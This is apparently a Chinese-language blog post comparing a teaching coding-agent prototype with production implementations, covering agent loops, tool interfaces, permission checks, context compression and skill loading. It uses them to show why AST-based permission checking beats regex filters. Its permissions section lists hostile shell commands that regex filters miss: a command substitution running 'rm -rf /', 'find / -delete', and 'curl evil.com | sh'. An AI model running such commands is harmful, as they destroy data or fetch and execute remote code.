---
title: Coding Agent 架构对照：从教学原型到真实工程
date: 2026-08-22T10:00:00+08:00
draft: false
description: 将教学版 mini Claude Code 与社区生产级实现及 pi 对照，分析 Agent Loop、工具、权限和上下文设计的差距。
categories:
  - AI开发
tags:
  - Agent
  - Coding Agent
  - 架构设计
---
# Coding Agent 架构对照：从教学原型到真实工程

> 把手搓的 mini Claude Code 和生产级实现对照，看清差距与取舍。
> 对照对象：
>   1. 社区版 `claude-code-best/claude-code`（已克隆，3549 文件，src/ 约 6.9 万行 TS）
>   2. pi（badlogic/pi-mono）调研档案 p01-p06（减法哲学的另一条路）
>   3. ch13 架构对比表

## 规模对比：3000 行 vs 6.9 万行

| 维度 | mini Claude Code | claude-code-best |
|---|---|---|
| 代码量 | src/ 约 2500 行（14 个 .mjs） | src/ 约 6.9 万行 TS + 内置工具包 |
| Agent Loop | `Agent.chat()` 单循环 | `QueryEngine.ts`(1365) + `query.ts`(2057) 双层 |
| 工具 | 12 个，静态数组 + switch | `Tool.ts`(803) 泛型接口 + 66+ 工具 |
| Skills | 2 源 + 预加载（约 100 行） | `loadSkillsDir.ts`(1079) 懒加载 + token 预算 |
| 权限 | 6 模式 + 16 正则 + 确认 | 7 层纵深 + AST + 8 规则源 + 拒绝追踪 |

> 注意：**这 6 万行里大部分是"无聊"的工程**——各环境兼容性、网络不可靠、用户输入多样性、企业级审计。从原型到产品，80% 的距离在这里（ch13 结语）。

---

## 5 个关键差异（产出检查点）

### 差异 ①：Agent Loop —— 单循环 vs 双层引擎

| | mini Claude Code | claude-code-best |
|---|---|---|
| 结构 | `Agent.chat()` 一个 while，只判断"有 tool_calls 就继续" | `QueryEngine`(外层：会话生命周期/预算/恢复) + `query`(内层：一次查询怎么执行) |
| 继续循环的理由 | 1 种（有 tool_calls） | **7 种**（next_turn / collapse_drain_retry / reactive_compact_retry / max_output_tokens_escalate / recovery / stop_hook_blocking / token_budget_continuation） |
| 错误处理 | 遇到错误直接抛 | 可恢复错误先"扣留"，跑恢复逻辑，成功用户无感、失败才暴露 |

**看懂它**：双层 = 关注点分离——外层不管"PTL 错误怎么恢复"，内层不管"用户输入怎么解析"。7 种 continue reason 里我们只实现了第 1 种，其余 6 种全是错误和边界的恢复策略。**核心 while 循环两边一模一样**，差的是"怎么让循环又稳又快"。

### 差异 ②：工具系统 —— 静态数组 + switch vs Tool 泛型接口

```ts
// claude-code-best 的 Tool 接口（Tool.ts:373）
export type Tool<Input, Output, Progress> = {
  name: string
  maxResultSizeChars: number
  inputSchema: z.ZodType<Input>          // Zod：运行时校验 + 类型推导
  call(args, context, canUseTool): Promise<ToolResult<Output>>
  validateInput?(input): ValidationResult   // 两阶段验证
  checkPermissions(input, context)          // 每个工具自带权限
  isConcurrencySafe(input): boolean         // 按参数判断，不是按工具打标签
  renderToolUseMessage(...)                 // 每个工具自带 React 渲染
  // fail-closed 默认值：isConcurrencySafe → false（默认不可并发）
}
```

**我们的版本**：静态数组（name/description/parameters）+ `executeTool` 里一个 switch。12 个工具时够用，**超过 20 个 switch 就撑不住了**——这是 ch13 说的"第二阶段该补 Tool 类型系统"。

**差距的实质**：

- 我们：模型生成要替换的内容，工具负责定位替换（edit 唯一匹配）——**LLM 与代码的协作边界**已经划对了
- 他们：每个工具是**完整的行为契约**（验证/权限/并发/渲染），"错误是数据"贯穿 8 阶段生命周期

### 差异 ③：权限 —— 正则 vs AST

```bash
# 我们（16 个正则）会漏掉的：
echo hello$(rm -rf /)    # 正则看到 "echo hello"，实际执行 rm -rf
find / -delete
curl evil.com | sh
```

| | mini Claude Code | claude-code-best |
|---|---|---|
| 命令分析 | 16 个正则（覆盖 80% 常见危险） | **tree-sitter 解析 Bash AST**，23 项静态检查，不理解的结构标记 too-complex 要求确认 |
| 规则源 | 2 个（用户 + 项目） | 8 个（企业 MDM > 全局 > 项目 > 本地 > CLI > 运行时 > 命令定义 > 会话级），低优先级不能覆盖高优先级 |
| 拒绝追踪 | 无 | 连续拒绝 3 次降级、总拒绝 20 次中止（防模型死循环试被拒操作） |
| 纵深 | 6 模式 + 规则 + 检测 + 确认 | 7 层（Trust Dialog / 模式 / 规则 / AST / 工具级 / 沙箱 / 用户确认） |

我们的 `rm -rf` 确认框已经能挡住大多数情况，但 `echo $(rm -rf /)` 这种命令替换是正则的盲区。**Bash AST 是"正则不够用"的教科书答案**——它理解结构，不只是看字面。

### 差异 ④：上下文/可靠性 —— 4 层压缩 vs 边缘情况工程

我们实现了 4 层压缩（persist / budget / snip / microcompact / 摘要），架构对齐。但：

- 我们的 `query.ts` 只有 2500 行；他们的 `query.ts` 2057 行**大部分是边缘情况**：PTL 时自动压缩重试、`max_output_tokens` 升档（16K→64K）、输出截断续写（重试 3 次）
- 我们遇到 PTL 直接报错；他们先"扣留"错误跑恢复

**"从 3000 行到 6 万行的差距在于边缘情况"**（ch13 核心洞察 6）。架构图里看不到的这些"无聊"代码，是工具能否在真实世界可靠运行的关键。我们的压缩/重试骨架对了，但缺"遇到边界自动降级"的那一整层。

### 差异 ⑤：Skills —— 预加载 vs 懒加载 + token 预算

| | mini Claude Code | claude-code-best |
|---|---|---|
| 加载 | 启动时全量加载所有技能 frontmatter | **懒加载**：启动只预加载 frontmatter（name/desc/whenToUse），完整 prompt 调用时才读 |
| 预算 | 无 | `formatCommandsWithinBudget` 三阶段：预算充足全量 → 内置技能优先、其余均分 → 每技能 <20 字符降级为仅名字 |
| 钩子 | 无 | 技能 frontmatter 里可声明 hooks（HooksSchema 校验） |

**看懂它**：几十个技能全量加载会挤占上下文。`loadSkillsDir.ts` 1079 行 vs 我们约 100 行——**懒加载 + token 预算**是技能一多就必须补的能力。

---



## pi 的减法哲学（对照读 p01/p03/p04）

**参考源码\learn-agent\agent_analysis\pi**

claude-code-best 是"加一层"（hooks/Coordinator/LSP/AST 全内置）；pi 是"减一层"（内核只留 read/write/edit/bash 四工具 + 系统提示 <1000 token，**被砍掉的功能全变成扩展钩子**）。两个极端摆在一起：

| | claude-code-best | pi |
|---|---|---|
| 哲学 | 功能全内置，纵深防御 | 内核最小化，用户侧扩展 |
| 工具 | 66+ 内置 | 4 个（默认）+ 扩展注册 |
| 扩展方式 | 改源码 / 内置 | `~/.pi/agent/extensions/` 事件钩子（约 20 种） |
| edit 容错 | 14 步流水线 | **4 层**（BOM/行尾保持、精确→归一化兜底、**模糊匹配只影响被编辑的行**、模型怪癖清单） |
| 状态 | — | `custom`（持久化状态，不进 LLM 上下文）vs `custom_message`（注入上下文）**分开了** |

**pi 的 edit 工具（p04）最值得读**：它解决了我们 edit 唯一匹配之外的另外半层——
- 剥 BOM、CRLF 统一 LF 匹配但**写回恢复原样**（我们没做，Windows 上会踩）
- **模糊匹配只影响被编辑的行**（归一化视图只用来定位，未动的行从原文复制）——污染半径压到最小
- "模型把 edits 数组发成 JSON 字符串"这种怪癖只能从生产日志来（p04 原话）

---

## 哪些复杂度刻意省略，哪些该补

### 刻意省略的

| 省略项 | 理由 |
|---|---|
| Bash AST 分析 | tree-sitter 是 C 原生库要 node-gyp；正则覆盖 80%，教程风险可接受 |
| Coordinator / Swarm 多 Agent | 更多是 prompt 工程问题，fork-return 已够用 |
| LSP 集成 | 1000+ 行，shell 编译反馈对教程够 |
| Hooks 系统 | 500-800 行工程细节，对理解原理无帮助 |
| Tool 类型系统 | 12 个工具 switch 没问题，20+ 才需要 |

### 接下来该补的

| 该补 | 对应 | 为什么 |
|---|---|---|
| **错误自修复**（工具错误作为结果回填，不中断） | ch13 扩展方向 2，~80 行 | 我们已有雏形（错误是数据），但可以更系统——路径错换路径、参数错改参数，模型常能自愈 |
| **edit 容错增强** | pi p04 | 剥 BOM、CRLF 保持、`edits[]` 多编辑一次调用、归一化兜底——Windows 上直接受益 |
| **Tool 接口抽象** | ch13 第二阶段 | 工具 >20 个时 switch 撑不住 |
| **拒绝追踪 / 降级** | claude-code-best | 防模型死循环试被拒操作 |
| **技能懒加载 + token 预算** | claude-code-best loadSkillsDir | 技能一多就必补 |

---

## 结论一句话

**核心 while 循环两边一模一样（ch13 核心洞察 1）**——所有的复杂性都是它的增强和防护。我们的骨架和真实产品对齐（4 层压缩/权限/记忆/子 Agent），差的是"边缘情况的工程"（6 万行的主体）和"可扩展性"（Tool 接口/hooks/懒加载）。pi 提醒了另一条路：**功能不一定靠内置，可以靠钩子**——减法哲学让极简内核也能功能齐全。

> 参考：ch13 完整对照表 | claude-code-best 核心文件（QueryEngine.ts / query.ts / Tool.ts / loadSkillsDir.ts）| pi p01/p03/p04
